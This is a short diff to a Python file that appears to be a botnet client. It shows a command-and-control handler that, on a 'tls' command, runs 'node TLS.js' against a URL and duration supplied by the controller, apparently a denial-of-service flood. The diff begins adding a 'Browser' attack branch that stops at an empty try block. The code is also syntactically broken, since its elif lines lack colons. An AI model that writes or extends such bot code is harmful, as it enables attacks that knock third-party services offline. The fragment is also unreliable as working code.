@@ -1,3 +1,4 @@
+
 import socket
 import os
 import requests
@@ -70,4 +71,6 @@ elif command == "tls"
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 os.system(f'node TLS.js {url} {time}')
-        
+elif command == "Browser"
+            try: 
+                
